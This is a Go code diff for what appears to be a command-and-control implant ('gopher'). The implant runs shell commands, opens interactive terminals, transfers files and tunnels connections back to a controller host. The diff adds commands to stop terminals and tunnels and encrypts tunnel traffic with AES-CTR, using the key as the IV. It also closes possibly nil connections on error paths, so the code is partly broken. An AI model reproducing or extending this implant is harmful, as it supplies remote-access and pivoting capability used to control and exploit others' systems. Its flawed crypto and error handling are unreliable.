@@ -4,6 +4,8 @@ import (
 	"bufio"
 	"bytes"
 	"context"
+	"crypto/aes"
+	"crypto/cipher"
 	"crypto/rand"
 	"crypto/tls"
 	"crypto/x509"
@@ -12,6 +14,7 @@ import (
 	"github.com/vmihailenco/msgpack/v5"
 	"gopher/functions"
 	"gopher/utils"
+	"io"
 	"net"
 	"os"
 	"os/exec"
@@ -24,7 +27,8 @@ import (
 var UPLOADS map[string][]byte
 var DOWNLOADS map[string]utils.Connection
 var JOBS map[string]utils.Connection
-var TUNNELS map[int]utils.Connection
+var TUNNELS sync.Map
+var TERMINALS sync.Map
 
 func TaskProcess(commands [][]byte) [][]byte {
 	var (
@@ -96,8 +100,14 @@ func TaskProcess(commands [][]byte) [][]byte {
 		case utils.COMMAND_TERMINAL_START:
 			jobTerminal(command.Data)
 
+		case utils.COMMAND_TERMINAL_STOP:
+			taskTernalKill(command.Data)
+
 		case utils.COMMAND_TUNNEL_START:
 			jobTunnel(command.Data)
+
+		case utils.COMMAND_TUNNEL_STOP:
+			taskTunnelKill(command.Data)
 
 		case utils.COMMAND_UPLOAD:
 			data, err = taskUpload(command.Data)
@@ -409,6 +419,38 @@ func taskShell(paramsData []byte) ([]byte, error) {
 	output, _ := cmd.CombinedOutput()
 
 	return msgpack.Marshal(utils.AnsShell{Output: string(output)})
+}
+
+func taskTernalKill(paramsData []byte) {
+	var params utils.ParamsTerminalStop
+	err := msgpack.Unmarshal(paramsData, &params)
+	if err != nil {
+		return
+	}
+
+	value, ok := TERMINALS.Load(params.TermId)
+	if ok {
+		cancel, ok := value.(context.CancelFunc)
+		if ok {
+			cancel()
+		}
+	}
+}
+
+func taskTunnelKill(paramsData []byte) {
+	var params utils.ParamsTunnelStop
+	err := msgpack.Unmarshal(paramsData, &params)
+	if err != nil {
+		return
+	}
+
+	value, ok := TUNNELS.Load(params.ChannelId)
+	if ok {
+		cancel, ok := value.(context.CancelFunc)
+		if ok {
+			cancel()
+		}
+	}
 }
 
 func taskUpload(paramsData []byte) ([]byte, error) {
@@ -854,7 +896,7 @@ func jobTunnel(paramsData []byte) {
 
 	go func() {
 		active := true
-		clientConn, err := net.DialTimeout(params.Proto, params.Address, 500*time.Millisecond)
+		clientConn, err := net.DialTimeout(params.Proto, params.Address, 200*time.Millisecond)
 		if err != nil {
 			active = false
 		}
@@ -880,6 +922,7 @@ func jobTunnel(paramsData []byte) {
 			srvConn, err = net.Dial("tcp", profile.Addresses[0])
 		}
 		if err != nil {
+			srvConn.Close()
 			return
 		}
 
@@ -894,6 +937,7 @@ func jobTunnel(paramsData []byte) {
 		if profile.BannerSize > 0 {
 			_, err := functions.ConnRead(srvConn, profile.BannerSize)
 			if err != nil {
+				srvConn.Close()
 				return
 			}
 		}
@@ -902,10 +946,23 @@ func jobTunnel(paramsData []byte) {
 		functions.SendMsg(srvConn, jobMsg)
 
 		if !active {
+			srvConn.Close()
 			return
 		}
 
+		iv := tunKey
+
+		encCipher, _ := aes.NewCipher(tunKey)
+		encStream := cipher.NewCTR(encCipher, iv)
+		streamWriter := &cipher.StreamWriter{S: encStream, W: srvConn}
+
+		decCipher, _ := aes.NewCipher(tunKey)
+		decStream := cipher.NewCTR(decCipher, iv)
+		streamReader := &cipher.StreamReader{S: decStream, R: srvConn}
+
 		ctx, cancel := context.WithCancel(context.Background())
+		TUNNELS.Store(params.ChannelId, cancel)
+		defer TUNNELS.Delete(params.ChannelId)
 
 		var closeOnce sync.Once
 		closeAll := func() {
@@ -919,17 +976,25 @@ func jobTunnel(paramsData []byte) {
 		wg.Add(2)
 
 		go func() {
-			functions.RelayMsgToSocket(ctx, cancel, &wg, srvConn, clientConn, utils.SKey)
+			defer wg.Done()
+			io.Copy(clientConn, streamReader)
 			closeAll()
 		}()
 
 		go func() {
-			functions.RelaySocketToMsg(ctx, cancel, &wg, clientConn, srvConn, tunKey)
+			defer wg.Done()
+			io.Copy(streamWriter, clientConn)
+			closeAll()
+		}()
+
+		go func() {
+			<-ctx.Done()
 			closeAll()
 		}()
 
 		wg.Wait()
 
+		cancel()
 	}()
 }
 
